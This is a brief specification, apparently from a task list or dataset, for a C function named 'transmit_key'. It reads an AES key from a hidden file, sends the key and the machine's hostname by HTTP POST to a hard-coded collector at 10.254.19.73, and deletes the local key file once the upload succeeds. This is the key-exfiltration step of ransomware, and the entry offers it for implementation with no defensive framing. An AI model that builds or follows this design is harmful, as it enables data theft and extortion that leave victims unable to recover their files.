description: Reads /tmp/.master.key via fopen/fread, parses JSON using strstr(buf, "\"aes_key\":\"") to locate field, advances pointer by 11 bytes, extracts Base64 key to closing quote via strchr, validates length >0. Obtains system hostname via gethostname(). Constructs JSON {"aes_key":"...","hostname":"..."} and sends HTTP POST to http://10.254.19.73:8080/collect via libcurl with Content-Type: application/json. If HTTP response status is 200, removes /tmp/.master.key with remove().
name: transmit_key
